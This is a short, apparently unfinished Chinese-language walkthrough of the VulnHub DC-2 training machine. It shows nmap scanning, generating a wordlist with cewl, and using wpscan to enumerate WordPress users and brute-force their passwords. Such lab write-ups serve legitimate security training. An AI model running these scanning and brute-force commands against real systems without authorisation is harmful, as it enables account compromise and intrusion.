# DC 2

## 环境准备

- 镜像地址：https://www.vulnhub.com/entry/dc-2,311/

## 知识点

## 信息收集

```bash
ifconfig all # 这里是因为本地局域网
nmap -sP 192.168.2.0/24 # IP探测 扫描本地C段的网络端口信息
# 192.168.2.16
nmap -A -p- -T4 192.168.2.16
```

![](./img/vulnhub-dc2-1.png)

### 0x01-flag1

访问页面会被重定向到 http://dc-2，需要在hosts文件添加解析

```
windows添加
C:\Windows\System32\drivers\etc\host
在下面添加一条
192.168.2.16 dc-2

linux添加
vim /ect/hosts
192.168.2.16 dc-2
```

![](./img/vulnhub-dc2-2.png)

可以看到flag1，提示用cewl，一个用于抓取网站信息用于生成密码的工具，kali自带cewl
### 0x02-flag2

获取password密码表
```bash
cewl http://dc-2 > password
```

网站是WP，用wpscan工具进行爆破(kali自带)
```bash
wpscan --update # 需要先更新
wpscan --url http://dc-2 --enumerate u # 用户信息枚举
```

![](./img/vulnhub-dc2-3.png)

可以看到爆出三个用户，使用cewl爬取的密码文件进行爆破账号密码

```bash
wpscan --url http://dc-2 --passwords out.txt
```
## 漏洞利用

## 参考文章
- https://github.com/ffffffff0x/1earn/blob/004fbc731d7ce8004b9c2a38613d39f71cd8cb6e/1earn/Security/%E5%AE%89%E5%85%A8%E8%B5%84%E6%BA%90/%E9%9D%B6%E6%9C%BA/VulnHub/DC/DC2-WalkThrough.md